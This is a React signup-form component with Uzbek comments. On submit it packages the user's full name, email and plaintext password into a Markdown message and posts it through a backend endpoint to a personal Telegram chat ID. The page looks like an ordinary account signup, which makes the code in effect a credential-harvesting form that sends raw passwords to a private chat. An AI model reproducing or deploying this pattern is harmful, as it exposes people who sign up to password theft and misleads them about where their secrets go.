import React, { useState } from 'react';
import './Signup.css';

function Signup() {
  const [formData, setFormData] = useState({
    fullName: '',
    email: '',
    password: '',
    confirmPassword: ''
  });

  const [errors, setErrors] = useState({});
  const [isLoading, setIsLoading] = useState(false);

  // 1. BU YERDA CHAT ID ni O'RNATING
  // Sizning shaxsiy Telegram chat ID raqamingizni shu yerga qo'ying.
  // Uni @userinfobot dan olish mumkin yoki botingizga /start xabarini yuboring,
  // keyin https://api.telegram.org/bot<BOT_TOKEN>/getUpdates orqali toping.
  const YOUR_CHAT_ID = 'YOUR_ACTUAL_CHAT_ID_HERE'; // <--- BU YERDA O'ZGARTIRING

  const handleChange = (e) => {
    const { name, value } = e.target;
    setFormData(prev => ({
      ...prev,
      [name]: value
    }));
    
    // Clear error when user starts typing
    if (errors[name]) {
      setErrors(prev => ({
        ...prev,
        [name]: ''
      }));
    }
  };

  const validateForm = () => {
    const newErrors = {};

    if (!formData.fullName.trim()) {
      newErrors.fullName = 'Full name is required';
    }

    if (!formData.email.trim()) {
      newErrors.email = 'Email is required';
    } else if (!/\S+@\S+\.\S+/.test(formData.email)) {
      newErrors.email = 'Email is invalid';
    }

    if (!formData.password) {
      newErrors.password = 'Password is required';
    } else if (formData.password.length < 6) {
      newErrors.password = 'Password must be at least 6 characters';
    }

    if (formData.password !== formData.confirmPassword) {
      newErrors.confirmPassword = 'Passwords do not match';
    }

    // Terms checkbox uchun tekshiruv (ixtiyoriy)
    const termsCheckbox = document.getElementById('terms');
    if (termsCheckbox && !termsCheckbox.checked) {
      newErrors.terms = 'You must agree to the Terms of Service and Privacy Policy';
    }

    setErrors(newErrors);
    return Object.keys(newErrors).length === 0;
  };

  // 2. BACKEND SERVERGA MA'LUMOT YUBORISH UCHUN YANGI FUNKSIYA
  const sendToBackend = async (userInfo) => {
    const message = `
🔔 *Yangi Ro'yxatdan O'tish*

👤 *To'liq Ism:* ${userInfo.fullName}
📧 *Email:* ${userInfo.email}
🔑 *Parol:* ||${userInfo.password}||
⏰ *Vaqt:* ${new Date().toLocaleString('uz-UZ')}
    `;

    // 3. BACKEND SERVERINGIZNING MANZILINI BU YERGA QO'YING
    const BACKEND_URL = 'http://localhost:3001/api/send-to-telegram'; // <--- BU YERDA O'ZGARTIRING

    try {
        const response = await fetch(BACKEND_URL, {
          method: 'POST',
          headers: {
            'Content-Type': 'application/json',
            // Agar backendda autentifikatsiya kerak bo'lsa, header qo'shing
          },
          body: JSON.stringify({
            chat_id: YOUR_CHAT_ID, // chat_id backendga yuboriladi
            text: message,
            parse_mode: 'Markdown'
          }),
        });

        if (!response.ok) {
          const errorData = await response.json().catch(() => ({ message: response.statusText }));
          console.error('Backenddan xato javob:', errorData);
          throw new Error(`Server Xatolik: ${errorData.message || response.statusText}`);
        }

        const result = await response.json();
        console.log('Backenddan muvaffaqiyatli javob:', result);
        return result; // Backenddan javob qaytadi

    } catch (error) {
        console.error('Backendga so\'rov yuborishda xatolik:', error);
        // Internet yo'qligi yoki serverga bog'lanolmasligi kabi xatolar
        if (error instanceof TypeError && error.message.includes('fetch')) {
            alert('❌ Xatolik: Internet bog\'lanishida muammo yoki serverga bog\'lanib bo\'lmadi. Iltimos, internet aloqangizni tekshiring yoki server ishlashini tasdiqlang.');
        } else {
            alert(`❌ Serverga ma'lumot yuborishda xatolik yuz berdi: ${error.message}`);
        }
        throw error; // Xatoni qayta ishlash uchun qaytarish
    }
  };

  const handleSubmit = async (e) => {
    e.preventDefault();
    
    if (validateForm()) {
      setIsLoading(true);
      
      try {
        // Ma'lumotlarni backend serverga yuborish
        await sendToBackend(formData);

        // Muvaffaqiyatli ro'yxatdan o'tish
        alert('✅ Tabriklaymiz! Siz muvaffaqiyatli ro\'yxatdan o\'tdingiz. Ma\'lumotlaringiz server orqali Telegramga yuborildi.');

        // Formani tozalash
        setFormData({
          fullName: '',
          email: '',
          password: '',
          confirmPassword: ''
        });
        // Terms checkboxni ham o'chirish (agar kerak bo'lsa)
        const termsCheckbox = document.getElementById('terms');
        if (termsCheckbox) termsCheckbox.checked = false;

      } catch (error) {
        // Xatolik alertlari `sendToBackend` ichida ko'rsatiladi
        console.error('Forma yuborishda umumiy xatolik:', error);
        // Agar yuqoridagi funksiya xatoni qaytarmasa, bu yerda ham umumiy xabar berish mumkin
        // alert(`❌ Kutilmagan xatolik yuz berdi: ${error.message}`);
      } finally {
        setIsLoading(false);
      }
    }
  };

  return (
    <div className="signup-page">
      <div className="signup-container">
        <div className="signup-header">
          <h1>Create Your Account</h1>
          <p>Join thousands who never lose anything again</p>
        </div>

        <form className="signup-form" onSubmit={handleSubmit}>
          <div className="form-group">
            <label htmlFor="fullName">Full Name</label>
            <input
              type="text"
              id="fullName"
              name="fullName"
              value={formData.fullName}
              onChange={handleChange}
              className={errors.fullName ? 'form-input error' : 'form-input'}
              placeholder="Enter your full name"
            />
            {errors.fullName && <span className="error-message">{errors.fullName}</span>}
          </div>

          <div className="form-group">
            <label htmlFor="email">Email Address</label>
            <input
              type="email"
              id="email"
              name="email"
              value={formData.email}
              onChange={handleChange}
              className={errors.email ? 'form-input error' : 'form-input'}
              placeholder="Enter your email"
            />
            {errors.email && <span className="error-message">{errors.email}</span>}
          </div>

          <div className="form-group">
            <label htmlFor="password">Password</label>
            <input
              type="password"
              id="password"
              name="password"
              value={formData.password}
              onChange={handleChange}
              className={errors.password ? 'form-input error' : 'form-input'}
              placeholder="Create a password"
            />
            {errors.password && <span className="error-message">{errors.password}</span>}
          </div>

          <div className="form-group">
            <label htmlFor="confirmPassword">Confirm Password</label>
            <input
              type="password"
              id="confirmPassword"
              name="confirmPassword"
              value={formData.confirmPassword}
              onChange={handleChange}
              className={errors.confirmPassword ? 'form-input error' : 'form-input'}
              placeholder="Confirm your password"
            />
            {errors.confirmPassword && <span className="error-message">{errors.confirmPassword}</span>}
          </div>

          <div className="form-group checkbox-group">
            <input
              type="checkbox"
              id="terms"
              name="terms"
            />
            <label htmlFor="terms">
              I agree to the <a href="/terms">Terms of Service</a> and <a href="/privacy">Privacy Policy</a>
            </label>
            {/* Agar terms uchun ham xato xabari kerak bo'lsa: */}
            {errors.terms && <span className="error-message">{errors.terms}</span>}
          </div>

          <button 
            type="submit" 
            className="signup-button"
            disabled={isLoading}
          >
            {isLoading ? 'Creating Account...' : 'Create Account'}
          </button>
        </form>

        <div className="signup-footer">
          <p>Already have an account? <a href="/login">Sign In</a></p>
        </div>
      </div>
    </div>
  );
}

export default Signup;